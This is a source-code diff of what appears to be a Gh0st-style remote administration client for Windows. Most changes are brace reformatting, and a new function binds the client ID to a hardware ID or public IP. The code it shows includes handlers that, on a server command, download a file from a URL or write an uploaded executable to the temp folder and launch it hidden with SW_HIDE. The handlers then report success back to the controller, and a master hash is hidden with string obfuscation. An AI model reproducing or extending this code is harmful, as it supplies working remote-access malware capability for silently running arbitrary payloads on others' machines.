@@ -408,18 +408,21 @@ bool EnableShutdownPrivilege()
     return true;
 }
 
-class CDownloadCallback : public IBindStatusCallback {
+class CDownloadCallback : public IBindStatusCallback
+{
 private:
     DWORD m_startTime;
     DWORD m_timeout;  // 毫秒
 
 public:
-    CDownloadCallback(DWORD timeoutMs) : m_timeout(timeoutMs) {
+    CDownloadCallback(DWORD timeoutMs) : m_timeout(timeoutMs)
+    {
         m_startTime = GetTickCount();
     }
 
     HRESULT STDMETHODCALLTYPE OnProgress(ULONG ulProgress, ULONG ulProgressMax,
-        ULONG ulStatusCode, LPCWSTR szStatusText) override {
+                                         ULONG ulStatusCode, LPCWSTR szStatusText) override
+    {
         // 超时检查
         if (GetTickCount() - m_startTime > m_timeout) {
             return E_ABORT;  // 取消下载
@@ -428,18 +431,46 @@ public:
     }
 
     // 其他接口方法返回默认值
-    HRESULT STDMETHODCALLTYPE OnStartBinding(DWORD, IBinding*) override { return S_OK; }
-    HRESULT STDMETHODCALLTYPE GetPriority(LONG*) override { return S_OK; }
-    HRESULT STDMETHODCALLTYPE OnLowResource(DWORD) override { return S_OK; }
-    HRESULT STDMETHODCALLTYPE OnStopBinding(HRESULT, LPCWSTR) override { return S_OK; }
-    HRESULT STDMETHODCALLTYPE GetBindInfo(DWORD*, BINDINFO*) override { return S_OK; }
-    HRESULT STDMETHODCALLTYPE OnDataAvailable(DWORD, DWORD, FORMATETC*, STGMEDIUM*) override { return S_OK; }
-    HRESULT STDMETHODCALLTYPE OnObjectAvailable(REFIID, IUnknown*) override { return S_OK; }
+    HRESULT STDMETHODCALLTYPE OnStartBinding(DWORD, IBinding*) override
+    {
+        return S_OK;
+    }
+    HRESULT STDMETHODCALLTYPE GetPriority(LONG*) override
+    {
+        return S_OK;
+    }
+    HRESULT STDMETHODCALLTYPE OnLowResource(DWORD) override
+    {
+        return S_OK;
+    }
+    HRESULT STDMETHODCALLTYPE OnStopBinding(HRESULT, LPCWSTR) override
+    {
+        return S_OK;
+    }
+    HRESULT STDMETHODCALLTYPE GetBindInfo(DWORD*, BINDINFO*) override
+    {
+        return S_OK;
+    }
+    HRESULT STDMETHODCALLTYPE OnDataAvailable(DWORD, DWORD, FORMATETC*, STGMEDIUM*) override
+    {
+        return S_OK;
+    }
+    HRESULT STDMETHODCALLTYPE OnObjectAvailable(REFIID, IUnknown*) override
+    {
+        return S_OK;
+    }
 
     // IUnknown
-    ULONG STDMETHODCALLTYPE AddRef() override { return 1; }
-    ULONG STDMETHODCALLTYPE Release() override { return 1; }
-    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppv) override {
+    ULONG STDMETHODCALLTYPE AddRef() override
+    {
+        return 1;
+    }
+    ULONG STDMETHODCALLTYPE Release() override
+    {
+        return 1;
+    }
+    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppv) override
+    {
         if (riid == IID_IBindStatusCallback || riid == IID_IUnknown) {
             *ppv = this;
             return S_OK;
@@ -448,7 +479,8 @@ public:
     }
 };
 
-void DownExecute(const std::string &strUrl, CManager *This) {
+void DownExecute(const std::string &strUrl, CManager *This)
+{
     // 临时路径
     char szTempPath[MAX_PATH], szSavePath[MAX_PATH];
     GetTempPathA(MAX_PATH, szTempPath);
@@ -458,23 +490,46 @@ void DownExecute(const std::string &strUrl, CManager *This) {
     // 下载并运行
     const int timeoutMs = 30 * 1000;
     CDownloadCallback callback(timeoutMs);
-    if (S_OK == URLDownloadToFileA(NULL, strUrl.c_str(), szSavePath, 0, &callback))
-    {
+    if (S_OK == URLDownloadToFileA(NULL, strUrl.c_str(), szSavePath, 0, &callback)) {
         ShellExecuteA(NULL, "open", szSavePath, NULL, NULL, SW_HIDE);
         Mprintf("Download Exec Success: %s\n", strUrl.c_str());
         char buf[100];
         sprintf_s(buf, "Client %llu download exec succeed", This->GetClientID());
         ClientMsg msg("执行成功", buf);
         This->SendData(LPBYTE(&msg), sizeof(msg));
-    }
-    else
-    {
+    } else {
         Mprintf("Download Exec Failed: %s\n", strUrl.c_str());
         char buf[100];
         sprintf_s(buf, "Client %llu download exec failed", This->GetClientID());
         ClientMsg msg("执行失败", buf);
         This->SendData(LPBYTE(&msg), sizeof(msg));
     }
+}
+
+#include "common/location.h"
+std::string getHardwareIDByCfg(const std::string& pwdHash, const std::string& masterHash)
+{
+    config* m_iniFile = nullptr;
+#ifdef _DEBUG
+    m_iniFile = pwdHash == masterHash ? new config : new iniFile;
+#else
+    m_iniFile = new iniFile;
+#endif
+    int version = m_iniFile->GetInt("settings", "BindType", 0);
+    std::string master = m_iniFile->GetStr("settings", "master");
+    SAFE_DELETE(m_iniFile);
+    switch (version) {
+    case 0:
+        return getHardwareID();
+    case 1: {
+        if (!master.empty()) {
+            return master;
+        }
+        IPConverter cvt;
+        return cvt.getPublicIP();
+    }
+    }
+    return "";
 }
 
 VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
@@ -489,21 +544,19 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     std::string publicIP = m_ClientObject->GetClientIP();
 
     switch (szBuffer[0]) {
-    case CMD_SET_GROUP:{
+    case CMD_SET_GROUP: {
         std::string group = std::string((char*)szBuffer + 1);
         iniFile cfg(CLIENT_PATH);
         cfg.SetStr("settings", "group_name", group);
         break;
     }
 
-    case COMMAND_DOWN_EXEC:
-    {
+    case COMMAND_DOWN_EXEC: {
         std::thread(DownExecute, std::string((char*)szBuffer + 1), this).detach();
         break;
     }
 
-    case COMMAND_UPLOAD_EXEC:
-    {
+    case COMMAND_UPLOAD_EXEC: {
         if (ulLength < 5) break;
 
         DWORD dwFileSize = *(DWORD*)(szBuffer + 1);
@@ -516,8 +569,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         sprintf_s(szSavePath, "%sUpload_%d.exe", szTempPath, rand() % 10086);
 
         FILE* fp = fopen(szSavePath, "wb");
-        if (fp)
-        {
+        if (fp) {
             fwrite(pFileData, 1, dwFileSize, fp);
             fclose(fp);
             ShellExecuteA(NULL, "open", szSavePath, NULL, NULL, SW_HIDE);
@@ -583,7 +635,9 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         std::string masterHash(skCrypt(MASTER_HASH));
         const char* pwdHash = m_conn->pwdHash[0] ? m_conn->pwdHash : masterHash.c_str();
         if (passCode[0] == 0) {
-            std::string devId = getDeviceID();
+            static std::string hardwareId = getHardwareIDByCfg(pwdHash, masterHash);
+            static std::string hashedID = hashSHA256(hardwareId);
+            static std::string devId = getFixedLengthID(hashedID);
             memcpy(buf + 24, buf + 12, 8); // 消息签名
             memcpy(buf + 96, buf + 8, 4); // 时间戳
             memcpy(buf + 5, devId.c_str(), devId.length());		// 16字节
